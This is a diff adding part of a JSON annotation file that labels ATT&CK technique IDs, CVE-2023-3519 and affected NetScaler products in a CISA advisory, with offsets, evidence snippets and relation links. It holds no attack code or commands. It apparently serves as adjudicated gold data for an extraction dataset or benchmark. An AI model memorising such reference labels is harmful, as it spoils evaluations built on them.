+      "normalized_id": "T1036.008",
+      "evidence": "T1036.008\n"
+    },
+    {
+      "id": "E13",
+      "text": "T1070.002",
+      "type": "AttackTechnique",
+      "start": 9195,
+      "end": 9204,
+      "normalized_id": "T1070.002",
+      "evidence": "T1070.002\n"
+    },
+    {
+      "id": "E14",
+      "text": "T1090.001",
+      "type": "AttackTechnique",
+      "start": 7832,
+      "end": 7841,
+      "normalized_id": "T1090.001",
+      "evidence": "T1090.001\n"
+    },
+    {
+      "id": "E15",
+      "text": "T1106",
+      "type": "AttackTechnique",
+      "start": 8563,
+      "end": 8568,
+      "normalized_id": "T1106",
+      "evidence": "T1106\n"
+    },
+    {
+      "id": "E16",
+      "text": "T1547",
+      "type": "AttackTechnique",
+      "start": 12557,
+      "end": 12562,
+      "normalized_id": "T1547",
+      "evidence": "T1547\n"
+    },
+    {
+      "id": "E17",
+      "text": "T1552.004",
+      "type": "AttackTechnique",
+      "start": 5589,
+      "end": 5598,
+      "normalized_id": "T1552.004",
+      "evidence": "T1552.004\n"
+    },
+    {
+      "id": "E18",
+      "text": "T1573.002",
+      "type": "AttackTechnique",
+      "start": 11787,
+      "end": 11796,
+      "normalized_id": "T1573.002",
+      "evidence": "T1573.002\n"
+    },
+    {
+      "id": "E19",
+      "text": "T1046",
+      "type": "AttackTechnique",
+      "start": 5115,
+      "end": 5120,
+      "normalized_id": "T1046",
+      "evidence": "T1046\n"
+    },
+    {
+      "id": "E20",
+      "text": "T1074.001",
+      "type": "AttackTechnique",
+      "start": 10722,
+      "end": 10731,
+      "normalized_id": "T1074.001",
+      "evidence": "T1074.001\n"
+    },
+    {
+      "id": "E21",
+      "text": "T1059.004",
+      "type": "AttackTechnique",
+      "start": 8513,
+      "end": 8522,
+      "normalized_id": "T1059.004",
+      "evidence": "T1059.004\n"
+    },
+    {
+      "id": "E22",
+      "text": "T1016",
+      "type": "AttackTechnique",
+      "start": 5174,
+      "end": 5179,
+      "normalized_id": "T1016",
+      "evidence": "T1016\n"
+    },
+    {
+      "id": "E23",
+      "text": "T1482",
+      "type": "AttackTechnique",
+      "start": 6040,
+      "end": 6045,
+      "normalized_id": "T1482",
+      "evidence": "T1482\n"
+    },
+    {
+      "id": "E24",
+      "text": "T1070.004",
+      "type": "AttackTechnique",
+      "start": 9116,
+      "end": 9125,
+      "normalized_id": "T1070.004",
+      "evidence": "T1070.004\n"
+    },
+    {
+      "id": "E25",
+      "text": "T1560.001",
+      "type": "AttackTechnique",
+      "start": 6139,
+      "end": 6148,
+      "normalized_id": "T1560.001",
+      "evidence": "T1560.001\n"
+    },
+    {
+      "id": "E26",
+      "text": "T1572",
+      "type": "AttackTechnique",
+      "start": 11711,
+      "end": 11716,
+      "normalized_id": "T1572",
+      "evidence": "T1572\n"
+    },
+    {
+      "id": "E27",
+      "text": "T1036",
+      "type": "AttackTechnique",
+      "start": 6398,
+      "end": 6403,
+      "normalized_id": "T1036",
+      "evidence": "T1036.008\n"
+    },
+    {
+      "id": "E28",
+      "text": "T1548.001",
+      "type": "AttackTechnique",
+      "start": 5039,
+      "end": 5048,
+      "normalized_id": "T1548.001",
+      "evidence": "T1548.001\n"
+    },
+    {
+      "id": "E29",
+      "text": "T1588.002",
+      "type": "AttackTechnique",
+      "start": 9745,
+      "end": 9754,
+      "normalized_id": "T1588.002",
+      "evidence": "T1588.002\n"
+    },
+    {
+      "id": "E30",
+      "text": "T1074",
+      "type": "AttackTechnique",
+      "start": 6437,
+      "end": 6442,
+      "normalized_id": "T1074",
+      "evidence": "T1074\n"
+    },
+    {
+      "id": "E31",
+      "text": "T1005",
+      "type": "AttackTechnique",
+      "start": 5342,
+      "end": 5347,
+      "normalized_id": "T1005",
+      "evidence": "T1005\n"
+    },
+    {
+      "id": "E32",
+      "text": "T1016.001",
+      "type": "AttackTechnique",
+      "start": 6942,
+      "end": 6951,
+      "normalized_id": "T1016.001",
+      "evidence": "T1016.001\n"
+    },
+    {
+      "id": "E33",
+      "text": "T1070",
+      "type": "AttackTechnique",
+      "start": 9116,
+      "end": 9121,
+      "normalized_id": "T1070",
+      "evidence": "T1070.004\n"
+    },
+    {
+      "id": "E34",
+      "text": "T1190",
+      "type": "AttackTechnique",
+      "start": 4886,
+      "end": 4891,
+      "normalized_id": "T1190",
+      "evidence": "T1190\n"
+    },
+    {
+      "id": "E35",
+      "text": "T1105",
+      "type": "AttackTechnique",
+      "start": 4935,
+      "end": 4940,
+      "normalized_id": "T1105",
+      "evidence": "T1105\n"
+    },
+    {
+      "id": "E36",
+      "text": "T1222.002",
+      "type": "AttackTechnique",
+      "start": 12346,
+      "end": 12355,
+      "normalized_id": "T1222.002",
+      "evidence": "T1222.002\n"
+    },
+    {
+      "id": "E37",
+      "text": "T1140",
+      "type": "AttackTechnique",
+      "start": 11258,
+      "end": 11263,
+      "normalized_id": "T1140",
+      "evidence": "T1140\n"
+    },
+    {
+      "id": "E38",
+      "text": "T1505.003",
+      "type": "AttackTechnique",
+      "start": 4975,
+      "end": 4984,
+      "normalized_id": "T1505.003",
+      "evidence": "T1505.003\n"
+    },
+    {
+      "id": "E39",
+      "text": "T1036.005",
+      "type": "AttackTechnique",
+      "start": 8230,
+      "end": 8239,
+      "normalized_id": "T1036.005",
+      "evidence": "T1036.005\n"
+    },
+    {
+      "id": "E40",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 556,
+      "end": 569,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "Threat Actors Exploiting Citrix CVE-2023-3519 to Implant Webshells\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E41",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 1153,
+      "end": 1166,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "ructure Security Agency (CISA) is releasing this Cybersecurity Advisory to warn network defenders about exploitation of CVE-2023-3519, an unauthenticated remote code execution (RCE) vulnerability affecting NetScaler (formerly Citrix) Application Deliver",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E42",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 2475,
+      "end": 2488,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "AA23-201A Threat Actors Exploiting Citrix CVE-2023-3519 to Implant Webshells\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E43",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 3658,
+      "end": 3671,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "Citrix confirmed that the actors exploited a zero-day vulnerability: CVE-2023-3519.",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E44",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 4067,
+      "end": 4080,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "CVE-2023-3519\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E45",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 4081,
+      "end": 4094,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "CVE-2023-3519 is an unauthenticated RCE vulnerability affecting the following versions of NetScaler ADC and NetScaler Gateway:[\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E46",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 4733,
+      "end": 4746,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "CISA added CVE-2023-3519 to its \n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E47",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 14420,
+      "end": 14433,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "The threat actors exploited CVE-2023-3519 to implant a webshell on the organization’s NetScaler ADC appliance.\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E48",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 19499,
+      "end": 19512,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "The threat actors exploited CVE-2023-3519 to upload a TGZ file containing a generic webshell, discovery script, and \n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E49",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 22823,
+      "end": 22836,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "Exploitation of Citrix Zero-Day by Possible Espionage Actors (CVE-2023-3519)\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E50",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 22871,
+      "end": 22884,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "Will the real Citrix CVE-2023-3519 please stand up?\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E51",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 22954,
+      "end": 22967,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "Technical Summary of Observed Citrix CVE-2023-3519 Incidents\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E52",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 23047,
+      "end": 23060,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "Indicators of Compromise Scanner for Citrix ADC Zero-Day (CVE-2023-3519)\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E53",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 23418,
+      "end": 23431,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "Table 12: Victim 2-provided IOCs Affiliated with Citrix CVE-2023-3519 Exploitation\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E54",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 23834,
+      "end": 23847,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "Table 13: Third-party Provided IP Addresses Affiliated with Citrix CVE-2023-3519 Exploitation\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E55",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 24326,
+      "end": 24339,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "Table 14: Third-party Provided IOCs Affiliated with Citrix CVE-2023-3519 Exploitation\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E56",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 25948,
+      "end": 25961,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E57",
+      "text": "CVE-2023-3519",
+      "type": "Vulnerability",
+      "start": 28150,
+      "end": 28163,
+      "normalized_id": "CVE-2023-3519",
+      "evidence": "Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E58",
+      "text": "CVE-2023-3466",
+      "type": "Vulnerability",
+      "start": 28165,
+      "end": 28178,
+      "normalized_id": "CVE-2023-3466",
+      "evidence": "Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E59",
+      "text": "CVE-2023-3467",
+      "type": "Vulnerability",
+      "start": 28180,
+      "end": 28193,
+      "normalized_id": "CVE-2023-3467",
+      "evidence": "Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E60",
+      "text": "T1036",
+      "type": "AttackTechnique",
+      "start": 11483,
+      "end": 11488,
+      "normalized_id": "T1036",
+      "evidence": "T1036\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E61",
+      "text": "T1584",
+      "type": "AttackTechnique",
+      "start": 13095,
+      "end": 13100,
+      "normalized_id": "T1584",
+      "evidence": "T1584\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E62",
+      "text": "T1588.002",
+      "type": "AttackTechnique",
+      "start": 13131,
+      "end": 13140,
+      "normalized_id": "T1588.002",
+      "evidence": "T1588.002\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E63",
+      "text": "T1059.004",
+      "type": "AttackTechnique",
+      "start": 13191,
+      "end": 13200,
+      "normalized_id": "T1059.004",
+      "evidence": "T1059.004\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E64",
+      "text": "T1106",
+      "type": "AttackTechnique",
+      "start": 13216,
+      "end": 13221,
+      "normalized_id": "T1106",
+      "evidence": "T1106\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E65",
+      "text": "T1547",
+      "type": "AttackTechnique",
+      "start": 13260,
+      "end": 13265,
+      "normalized_id": "T1547",
+      "evidence": "T1547\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E66",
+      "text": "T1090.003",
+      "type": "AttackTechnique",
+      "start": 13293,
+      "end": 13302,
+      "normalized_id": "T1090.003",
+      "evidence": "T1090.003\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E67",
+      "text": "T1140",
+      "type": "AttackTechnique",
+      "start": 13347,
+      "end": 13352,
+      "normalized_id": "T1140",
+      "evidence": "T1140\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E68",
+      "text": "T1222.002",
+      "type": "AttackTechnique",
+      "start": 13460,
+      "end": 13469,
+      "normalized_id": "T1222.002",
+      "evidence": "T1222.002\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E69",
+      "text": "T1070",
+      "type": "AttackTechnique",
+      "start": 13492,
+      "end": 13497,
+      "normalized_id": "T1070",
+      "evidence": "T1070\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E70",
+      "text": "T1070.002",
+      "type": "AttackTechnique",
+      "start": 13552,
+      "end": 13561,
+      "normalized_id": "T1070.002",
+      "evidence": "T1070.002\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E71",
+      "text": "T1070.004",
+      "type": "AttackTechnique",
+      "start": 13599,
+      "end": 13608,
+      "normalized_id": "T1070.004",
+      "evidence": "T1070.004\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E72",
+      "text": "T1036",
+      "type": "AttackTechnique",
+      "start": 13626,
+      "end": 13631,
+      "normalized_id": "T1036",
+      "evidence": "T1036\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E73",
+      "text": "T1036.005",
+      "type": "AttackTechnique",
+      "start": 13684,
+      "end": 13693,
+      "normalized_id": "T1036.005",
+      "evidence": "T1036.005\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E74",
+      "text": "T1074.001",
+      "type": "AttackTechnique",
+      "start": 13730,
+      "end": 13739,
+      "normalized_id": "T1074.001",
+      "evidence": "T1074.001\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E75",
+      "text": "T1572",
+      "type": "AttackTechnique",
+      "start": 13763,
+      "end": 13768,
+      "normalized_id": "T1572",
+      "evidence": "T1572\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E76",
+      "text": "T1584",
+      "type": "AttackTechnique",
+      "start": 13903,
+      "end": 13908,
+      "normalized_id": "T1584",
+      "evidence": "T1584\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E77",
+      "text": "T1588.002",
+      "type": "AttackTechnique",
+      "start": 14034,
+      "end": 14043,
+      "normalized_id": "T1588.002",
+      "evidence": "T1588.002\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E78",
+      "text": "T1190",
+      "type": "AttackTechnique",
+      "start": 14386,
+      "end": 14391,
+      "normalized_id": "T1190",
+      "evidence": "T1190\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E79",
+      "text": "T1059.004",
+      "type": "AttackTechnique",
+      "start": 14635,
+      "end": 14644,
+      "normalized_id": "T1059.004",
+      "evidence": "T1059.004\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E80",
+      "text": "T1106",
+      "type": "AttackTechnique",
+      "start": 14702,
+      "end": 14707,
+      "normalized_id": "T1106",
+      "evidence": "T1106\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E81",
+      "text": "T1547",
+      "type": "AttackTechnique",
+      "start": 14882,
+      "end": 14887,
+      "normalized_id": "T1547",
+      "evidence": "T1547\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E82",
+      "text": "T1505.003",
+      "type": "AttackTechnique",
+      "start": 15011,
+      "end": 15020,
+      "normalized_id": "T1505.003",
+      "evidence": "T1505.003\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E83",
+      "text": "T1548.001",
+      "type": "AttackTechnique",
+      "start": 15265,
+      "end": 15274,
+      "normalized_id": "T1548.001",
+      "evidence": "T1548.001\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E84",
+      "text": "T1140",
+      "type": "AttackTechnique",
+      "start": 15533,
+      "end": 15538,
+      "normalized_id": "T1140",
+      "evidence": "T1140\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E85",
+      "text": "T1222.002",
+      "type": "AttackTechnique",
+      "start": 15807,
+      "end": 15816,
+      "normalized_id": "T1222.002",
+      "evidence": "T1222.002\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E86",
+      "text": "T1070",
+      "type": "AttackTechnique",
+      "start": 16035,
+      "end": 16040,
+      "normalized_id": "T1070",
+      "evidence": "T1070\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E87",
+      "text": "T1070.002",
+      "type": "AttackTechnique",
+      "start": 16142,
+      "end": 16151,
+      "normalized_id": "T1070.002",
+      "evidence": "T1070.002\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E88",
+      "text": "T1070.004",
+      "type": "AttackTechnique",
+      "start": 16272,
+      "end": 16281,
+      "normalized_id": "T1070.004",
+      "evidence": "T1070.004\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E89",
+      "text": "T1036",
+      "type": "AttackTechnique",
+      "start": 16362,
+      "end": 16367,
+      "normalized_id": "T1036",
+      "evidence": "T1036\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E90",
+      "text": "T1036.005",
+      "type": "AttackTechnique",
+      "start": 16558,
+      "end": 16567,
+      "normalized_id": "T1036.005",
+      "evidence": "T1036.005\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E91",
+      "text": "T1036.008",
+      "type": "AttackTechnique",
+      "start": 16656,
+      "end": 16665,
+      "normalized_id": "T1036.008",
+      "evidence": "T1036.008\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E92",
+      "text": "T1552.001",
+      "type": "AttackTechnique",
+      "start": 16898,
+      "end": 16907,
+      "normalized_id": "T1552.001",
+      "evidence": "T1552.001\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E93",
+      "text": "T1552.004",
+      "type": "AttackTechnique",
+      "start": 17087,
+      "end": 17096,
+      "normalized_id": "T1552.004",
+      "evidence": "T1552.004\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E94",
+      "text": "T1482",
+      "type": "AttackTechnique",
+      "start": 17331,
+      "end": 17336,
+      "normalized_id": "T1482",
+      "evidence": "T1482\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E95",
+      "text": "T1069.002",
+      "type": "AttackTechnique",
+      "start": 17425,
+      "end": 17434,
+      "normalized_id": "T1069.002",
+      "evidence": "T1069.002\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E96",
+      "text": "T1018",
+      "type": "AttackTechnique",
+      "start": 17503,
+      "end": 17508,
+      "normalized_id": "T1018",
+      "evidence": "T1018\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E97",
+      "text": "T1016",
+      "type": "AttackTechnique",
+      "start": 17820,
+      "end": 17825,
+      "normalized_id": "T1016",
+      "evidence": "T1016\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E98",
+      "text": "T1016.001",
+      "type": "AttackTechnique",
+      "start": 17943,
+      "end": 17952,
+      "normalized_id": "T1016.001",
+      "evidence": "T1016.001\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E99",
+      "text": "T1046",
+      "type": "AttackTechnique",
+      "start": 18179,
+      "end": 18184,
+      "normalized_id": "T1046",
+      "evidence": "T1046\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E100",
+      "text": "T1560.001",
+      "type": "AttackTechnique",
+      "start": 18475,
+      "end": 18484,
+      "normalized_id": "T1560.001",
+      "evidence": "T1560.001\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E101",
+      "text": "T1005",
+      "type": "AttackTechnique",
+      "start": 18681,
+      "end": 18686,
+      "normalized_id": "T1005",
+      "evidence": "T1005\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E102",
+      "text": "T1074",
+      "type": "AttackTechnique",
+      "start": 18815,
+      "end": 18820,
+      "normalized_id": "T1074",
+      "evidence": "T1074\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E103",
+      "text": "T1074.001",
+      "type": "AttackTechnique",
+      "start": 18996,
+      "end": 19005,
+      "normalized_id": "T1074.001",
+      "evidence": "T1074.001\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E104",
+      "text": "T1573.002",
+      "type": "AttackTechnique",
+      "start": 19304,
+      "end": 19313,
+      "normalized_id": "T1573.002",
+      "evidence": "T1573.002\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E105",
+      "text": "T1105",
+      "type": "AttackTechnique",
+      "start": 19465,
+      "end": 19470,
+      "normalized_id": "T1105",
+      "evidence": "T1105\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E106",
+      "text": "T1572",
+      "type": "AttackTechnique",
+      "start": 19644,
+      "end": 19649,
+      "normalized_id": "T1572",
+      "evidence": "T1572\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E107",
+      "text": "T1090.001",
+      "type": "AttackTechnique",
+      "start": 19729,
+      "end": 19738,
+      "normalized_id": "T1090.001",
+      "evidence": "T1090.001\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E108",
+      "text": "T1090.003",
+      "type": "AttackTechnique",
+      "start": 19930,
+      "end": 19939,
+      "normalized_id": "T1090.003",
+      "evidence": "T1090.003\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E109",
+      "text": "T1531",
+      "type": "AttackTechnique",
+      "start": 20146,
+      "end": 20151,
+      "normalized_id": "T1531",
+      "evidence": "T1531\n",
+      "notes": "exhaustive explicit identifier mention"
+    },
+    {
+      "id": "E110",
+      "text": "NetScaler (formerly Citrix) Application Delivery Controller (ADC)",
+      "type": "Configuration",
+      "start": 1239,
+      "end": 1304,
+      "normalized_id": "cpe:2.3:a:citrix:netscaler_application_delivery_controller:*:*:*:*:*:*:*:*",
+      "evidence": "exploitation of CVE-2023-3519, an unauthenticated remote code execution (RCE) vulnerability affecting NetScaler (formerly Citrix) Application Delivery Controller (ADC) and NetScaler Gateway.",
+      "notes": "v4.5 human reannotation and adjudication"
+    },
+    {
+      "id": "E111",
+      "text": "NetScaler Gateway",
+      "type": "Configuration",
+      "start": 1309,
+      "end": 1326,
+      "normalized_id": "cpe:2.3:a:citrix:netscaler_gateway:*:*:*:*:*:*:*:*",
+      "evidence": "exploitation of CVE-2023-3519, an unauthenticated remote code execution (RCE) vulnerability affecting NetScaler (formerly Citrix) Application Delivery Controller (ADC) and NetScaler Gateway.",
+      "notes": "v4.5 human reannotation and adjudication"
+    },
+    {
+      "id": "E112",
+      "text": "NetScaler ADC",
+      "type": "Configuration",
+      "start": 3504,
+      "end": 3517,
+      "normalized_id": "cpe:2.3:a:citrix:netscaler_application_delivery_controller:*:*:*:*:*:*:*:*",
+      "evidence": "actors may have exploited a zero-day vulnerability in NetScaler ADC to implant a webshell on their non-production NetScaler ADC appliance. Citrix confirmed that the actors exploited a zero-day vulnerability: CVE-2023-3519.",
+      "notes": "v4.5 human reannotation and adjudication"
+    },
+    {
+      "id": "E113",
+      "text": "NetScaler ADC",
+      "type": "Configuration",
+      "start": 4171,
+      "end": 4184,
+      "normalized_id": "cpe:2.3:a:citrix:netscaler_application_delivery_controller:*:*:*:*:*:*:*:*",
+      "evidence": "CVE-2023-3519 is an unauthenticated RCE vulnerability affecting the following versions of NetScaler ADC and NetScaler Gateway",
+      "notes": "v4.5 human reannotation and adjudication"
+    },
+    {
+      "id": "E114",
+      "text": "NetScaler Gateway",
+      "type": "Configuration",
+      "start": 4189,
+      "end": 4206,
+      "normalized_id": "cpe:2.3:a:citrix:netscaler_gateway:*:*:*:*:*:*:*:*",
+      "evidence": "CVE-2023-3519 is an unauthenticated RCE vulnerability affecting the following versions of NetScaler ADC and NetScaler Gateway",
+      "notes": "v4.5 human reannotation and adjudication"
+    },
+    {
+      "id": "E115",
+      "text": "NetScaler ADC",
+      "type": "Configuration",
+      "start": 14478,
+      "end": 14491,
+      "normalized_id": "cpe:2.3:a:citrix:netscaler_application_delivery_controller:*:*:*:*:*:*:*:*",
+      "evidence": "Table 2: Cyber Threat Actors ATT&CK Techniques for Initial Access\nTechnique Title\nID\nUse\nExploit Public-Facing Application\nT1190\nThe threat actors exploited CVE-2023-3519 to implant a webshell on the organization’s NetScaler ADC appliance.",
+      "notes": "v4.5 human reannotation and adjudication"
+    }
+  ],
+  "relations": [
+    {
+      "id": "R1",
+      "type": "exploited_by",
+      "head": "E47",
+      "tail": "E78",
+      "evidence": "T1190\nThe threat actors exploited CVE-2023-3519 to implant a webshell on the organization’s NetScaler ADC appliance.",
+      "adjudication_basis": "chapter3-boundary-sync-v2; same sentence or self-contained clause with an explicit exploitation predicate; aa23-201a/R1 directly binds CVE-2023-3519 to T1190 as the exploit behavior",
+      "evidence_start": 14386,
+      "evidence_end": 14502
+    },
+    {
+      "id": "R2",
+      "type": "affects",
+      "head": "E41",
+      "tail": "E110",
+      "evidence": "exploitation of CVE-2023-3519, an unauthenticated remote code execution (RCE) vulnerability affecting NetScaler (formerly Citrix) Application Delivery Controller (ADC) and NetScaler Gateway.",
+      "evidence_start": 1137,
+      "evidence_end": 1327,
+      "adjudication_basis": "summary explicitly lists both affected NetScaler products"
+    },
+    {
+      "id": "R3",
+      "type": "affects",
+      "head": "E41",
+      "tail": "E111",
+      "evidence": "exploitation of CVE-2023-3519, an unauthenticated remote code execution (RCE) vulnerability affecting NetScaler (formerly Citrix) Application Delivery Controller (ADC) and NetScaler Gateway.",
+      "evidence_start": 1137,
+      "evidence_end": 1327,
+      "adjudication_basis": "summary explicitly lists both affected NetScaler products"
+    },
+    {
+      "id": "R4",
+      "type": "affects",
+      "head": "E43",
+      "tail": "E112",
+      "evidence": "actors may have exploited a zero-day vulnerability in NetScaler ADC to implant a webshell on their non-production NetScaler ADC appliance. Citrix confirmed that the actors exploited a zero-day vulnerability: CVE-2023-3519.",
+      "evidence_start": 3450,
+      "evidence_end": 3672,
+      "adjudication_basis": "two adjacent sentences resolve the zero-day CVE to NetScaler ADC"
+    },
+    {
+      "id": "R5",
+      "type": "affects",
+      "head": "E45",
+      "tail": "E113",
+      "evidence": "CVE-2023-3519 is an unauthenticated RCE vulnerability affecting the following versions of NetScaler ADC and NetScaler Gateway:[",
+      "evidence_start": 4081,
+      "evidence_end": 4208,
+      "adjudication_basis": "technical overview explicitly lists both products"
+    },
+    {
+      "id": "R6",
+      "type": "affects",
+      "head": "E45",
+      "tail": "E114",
+      "evidence": "CVE-2023-3519 is an unauthenticated RCE vulnerability affecting the following versions of NetScaler ADC and NetScaler Gateway:[",
+      "evidence_start": 4081,
+      "evidence_end": 4208,
+      "adjudication_basis": "technical overview explicitly lists both products"
+    },
+    {
+      "id": "R7",
+      "type": "affects",
+      "head": "E47",
+      "tail": "E115",
+      "evidence": "Table 2: Cyber Threat Actors ATT&CK Techniques for Initial Access\nTechnique Title\nID\nUse\nExploit Public-Facing Application\nT1190\nThe threat actors exploited CVE-2023-3519 to implant a webshell on the organization’s NetScaler ADC appliance.",
+      "evidence_start": 14263,
+      "evidence_end": 14502,
+      "adjudication_basis": "table row directly links the CVE to NetScaler ADC"
+    }
+  ],
+  "boundary_contract_version": "chapter3-boundary-sync-v2"
+}
